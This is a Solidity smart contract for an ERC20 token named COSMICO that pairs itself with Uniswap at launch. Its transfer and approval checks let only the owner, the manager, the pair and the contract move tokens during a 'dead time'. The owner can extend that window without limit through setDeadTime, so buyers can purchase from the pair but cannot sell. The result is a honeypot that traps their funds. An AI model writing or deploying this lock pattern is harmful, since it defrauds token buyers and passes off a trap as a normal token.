contract COSMICO is EXERC20 ("COSMICO", "SMI")  {
    uint256 public constant fullMint = 25000e18; 
    address public manager;
    uint256 private deadTime = 172800; // 2 days in secs
    uint256 public contractDeployT;
    address public ourContractAddr;
    address public ourUniPairAddr;
    IUniswapV2Pair public ourUniPair;

    IUniswapV2Factory public uniswapFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    IUniswapV2Router02 public uniswapRouterV2=IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    event transCoin(string whatdo, address from, address to, uint256 value, bool result);
    
    constructor ()  public {   
        manager = _msgSender();
        _mint(manager,fullMint);
        ourContractAddr=address(this);
        ourUniPairAddr=uniswapFactory.createPair(uniswapRouterV2.WETH(), ourContractAddr);
        ourUniPair = IUniswapV2Pair(ourUniPairAddr);
        contractDeployT = block.timestamp;
    }

    function getDeadTime() public view onlyOwner returns (uint256) {
        return deadTime;
    }

    function setDeadTime(uint256 spausetime) public onlyOwner returns (uint256) {
        deadTime = spausetime;
    }
    
    function toEndOfPause() public view returns(uint256) {
        if (contractDeployT.add(deadTime) > block.timestamp) {
            return contractDeployT.add(deadTime).sub(block.timestamp);
        }
        else {
            return 0;
        }
    }

    function deadCheckT(string memory whatdo, address spender, uint256 tokens) internal returns (bool) {
        bool fullstart=false;
        address caller=_msgSender();
        if ((contractDeployT.add(deadTime) <  block.timestamp) || (caller == owner()) || (caller == manager)) {
            fullstart=true;
        }
        emit transCoin(whatdo,caller,spender,tokens,fullstart);   
        return fullstart;
    }

    function deadCheckTtrans(string memory whatdo, address sendfr, address sendto, uint256 tokens) internal returns (bool) {
        bool fullstart=false;
        if ((contractDeployT.add(deadTime) <  block.timestamp) || ( sendfr== owner()) || (sendfr == manager) || (sendfr == ourUniPairAddr) || (sendfr == ourContractAddr)) {
            fullstart=true;
        }
        emit transCoin(whatdo,sendfr,sendto,tokens,fullstart);   
        return fullstart;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override {
        require(deadCheckTtrans("TokenTransferTimeCheck",from,to,amount),"Token start timeout in progress");
    }

    function approve(address spender, uint256 totcoin) public override returns (bool) {
        require(deadCheckT("ApproveCheck", spender, totcoin),"Token start timeout in progress"); 
        _approve(_msgSender(), spender, totcoin);
        return true;
    }

}